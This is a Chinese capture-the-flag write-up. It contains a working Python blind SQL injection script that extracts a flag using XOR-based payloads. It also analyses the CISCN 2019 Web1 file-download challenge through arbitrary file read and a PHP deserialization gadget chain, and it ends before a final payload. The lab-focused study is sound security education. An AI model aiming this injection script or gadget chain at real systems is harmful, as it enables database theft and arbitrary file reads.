<p>可以看到异或运算的结果不同，说明为数字型注入，那我们借着异或方式来构造payload</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">'http://node4.anna.nssctf.cn:28470/index.php'</span>
flag = <span class="hljs-string">""</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (left + right) // <span class="hljs-number">2</span>
    <span class="hljs-keyword">while</span> left &lt; right:
        payload = <span class="hljs-string">f"0^(ascii(substr((select(flag)from(flag)),<span class="hljs-subst">{i}</span>,1))&gt;<span class="hljs-subst">{mid}</span>)"</span>
        data= {<span class="hljs-string">"id"</span>:payload}
        <span class="hljs-comment">#start_time = time.time()</span>
        response = requests.post(url = url, data = data).text
        <span class="hljs-comment">#end_time = time.time()</span>
        <span class="hljs-comment">#use_time = end_time - start_time</span>

        <span class="hljs-keyword">if</span> <span class="hljs-string">"Hello"</span> <span class="hljs-keyword">in</span> response:
            left = mid + <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid = (left + right) // <span class="hljs-number">2</span>

    <span class="hljs-comment">#print(mid)</span>
    flag += <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"flag:"</span>, flag)</code></pre>
<p>由于页面有数据回显，因此这里没必要用if来判断</p>
<h1 id="ciscn-2019华北day1web1">[CISCN 2019华北Day1]Web1</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124164241331.png" alt="image-20240124164241331"></p>
<p>进入首页发现是一个登录页面，扫网站无果后，尝试注册用户，接着看到有一个上传文件的功能，不过限制了上传马，那我们正常上传指定文件类型，发现出现下载和删除两个功能。那很容易想到这两个功能肯定存在漏洞，根据漏洞利用来看，我们先找下载功能的漏洞。点击抓包如图所示</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172310599.png" alt="image-20240124172310599"></p>
<p>可以看到能实现任意文件的读取</p>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>])) {
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    <span class="hljs-keyword">die</span>();
}
<span class="hljs-meta">?&gt;</span>


&lt;!DOCTYPE html&gt;
&lt;html&gt;

&lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;
&lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;
&lt;title&gt;网盘管理&lt;/title&gt;

&lt;head&gt;
    &lt;link href=<span class="hljs-string">"static/css/bootstrap.min.css"</span> rel=<span class="hljs-string">"stylesheet"</span>&gt;
    &lt;link href=<span class="hljs-string">"static/css/panel.css"</span> rel=<span class="hljs-string">"stylesheet"</span>&gt;
    &lt;script src=<span class="hljs-string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;
    &lt;script src=<span class="hljs-string">"static/js/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;
    &lt;script src=<span class="hljs-string">"static/js/toast.js"</span>&gt;&lt;/script&gt;
    &lt;script src=<span class="hljs-string">"static/js/panel.js"</span>&gt;&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;nav aria-label=<span class="hljs-string">"breadcrumb"</span>&gt;
    &lt;ol <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">breadcrumb</span>"&gt;</span>
<span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>="<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>"&gt;管理面板&lt;/<span class="hljs-title">li</span>&gt;</span>
<span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>="<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>"&gt;&lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>="<span class="hljs-title">fileInput</span>" <span class="hljs-title">class</span>="<span class="hljs-title">fileLabel</span>"&gt;上传文件&lt;/<span class="hljs-title">label</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span>
<span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>="<span class="hljs-title">active</span> <span class="hljs-title">ml</span>-<span class="hljs-title">auto</span>"&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="#"&gt;你好 &lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SESSION</span>['<span class="hljs-title">username</span>']?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span>
<span class="hljs-class">    &lt;/<span class="hljs-title">ol</span>&gt;</span>
<span class="hljs-class">&lt;/<span class="hljs-title">nav</span>&gt;</span>
<span class="hljs-class">&lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>="<span class="hljs-title">file</span>" <span class="hljs-title">id</span>="<span class="hljs-title">fileInput</span>" <span class="hljs-title">class</span>="<span class="hljs-title">hidden</span>"&gt;</span>
<span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">top</span>" <span class="hljs-title">id</span>="<span class="hljs-title">toast</span>-<span class="hljs-title">container</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class"></span>
<span class="hljs-class">&lt;?<span class="hljs-title">php</span></span>
<span class="hljs-class"><span class="hljs-title">include</span> "<span class="hljs-title">class</span>.<span class="hljs-title">php</span>";</span>
<span class="hljs-class"></span>
<span class="hljs-class">$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> <span class="hljs-title">FileList</span>($<span class="hljs-title">_SESSION</span>['<span class="hljs-title">sandbox</span>']);</span>
<span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Name</span>();</span>
<span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Size</span>();</span>
<span class="hljs-class">?&gt;</span></code></pre>
<p>class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">"127.0.0.1"</span>;
<span class="hljs-variable">$dbuser</span> = <span class="hljs-string">"root"</span>;
<span class="hljs-variable">$dbpass</span> = <span class="hljs-string">"root"</span>;
<span class="hljs-variable">$dbname</span> = <span class="hljs-string">"dropbox"</span>;
<span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;
        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>{
        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">"s"</span>, <span class="hljs-variable">$username</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();
        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">"SiAchGHmFx"</span>);
        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">"ss"</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>{
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">"SiAchGHmFx"</span>);
        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">"s"</span>, <span class="hljs-variable">$username</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$expect</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();
        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();
        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();
        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);

        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">"."</span>, <span class="hljs-variable">$filenames</span>);
        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);
        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">".."</span>, <span class="hljs-variable">$filenames</span>);
        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);

        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) {
            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();
            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);
            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);
            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>{
        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) {
            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable">$table</span> = <span class="hljs-string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;
        <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;thead&gt;&lt;tr&gt;'</span>;
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) {
            <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;th scope="col" class="text-center"&gt;'</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">'&lt;/th&gt;'</span>;
        }
        <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;
        <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) {
            <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;tr&gt;'</span>;
            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) {
                <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;td class="text-center"&gt;'</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">'&lt;/td&gt;'</span>;
            }
            <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;td class="text-center" filename="'</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;
            <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;/tr&gt;'</span>;
        }
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);
        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">' B'</span>, <span class="hljs-string">' KB'</span>, <span class="hljs-string">' MB'</span>, <span class="hljs-string">' GB'</span>, <span class="hljs-string">' TB'</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>download.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>])) {
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    <span class="hljs-keyword">die</span>();
}

<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])) {
    <span class="hljs-keyword">die</span>();
}

<span class="hljs-keyword">include</span> <span class="hljs-string">"class.php"</span>;
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"open_basedir"</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">":/etc:/tmp"</span>);

<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'sandbox'</span>]);
<span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();
<span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">"flag"</span>) === <span class="hljs-literal">false</span>) {
    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">"Content-type: application/octet-stream"</span>);
    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">"Content-Disposition: attachment; filename="</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>));
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"File not exist"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>delete.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>])) {
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    <span class="hljs-keyword">die</span>();
}

<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])) {
    <span class="hljs-keyword">die</span>();
}

<span class="hljs-keyword">include</span> <span class="hljs-string">"class.php"</span>;

<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'sandbox'</span>]);
<span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();
<span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>)) {
    <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">detele</span>();
    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">"Content-type: application/json"</span>);
    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"success"</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">"error"</span> =&gt; <span class="hljs-string">""</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">"Content-type: application/json"</span>);
    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"success"</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">"error"</span> =&gt; <span class="hljs-string">"File not exist"</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>我们可以发现存在敏感函数：<code>file_get_contents($this-&gt;filename);</code>，如果我们可以让filename为flag文件，那就得到flag了。</p>
<p>接下来就思考如何控制filename变量，我们先定位其所在函数</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172543945.png" alt="image-20240124172543945"></p>
<p>可以看到其位于File类的close函数，接下来看谁调用过该函数</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172614227.png" alt="image-20240124172614227"></p>
<p>我们可以在User类中的析构函数发现db调用了close函数，但如果我们直接利用这个链子是不行的，因为没有回显。那我们只好接着找寻其他回显数据的地方了。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172728776.png" alt="image-20240124172728776"></p>
<p>我们可以看到FileList类中的析构函数会回显对应的$func和$filename内容，那这里肯定就是最终获取flag的地方了，</p>
<p>接下来我们可以再看一下call魔术方法：当访问一个类中不可访问的方法时调用</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124173537688.png" alt="image-20240124173537688"></p>
<p>这里会将函数名引入funcs变量中，之后foreach循环，对每一个file变量对应的文件执行func也就是close方法，之后将得到的结果存入results数组中。</p>
<p>那链子基本明显了，就是User.destruct-》FileList.call-》File.destruct。</p>
<p>接下来就是寻找那里可以触发了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124173957173.png" alt="image-20240124173957173"></p>
<p>可以看到虽然download.php文件可以调用close，但是过滤了flag关键字。</p>
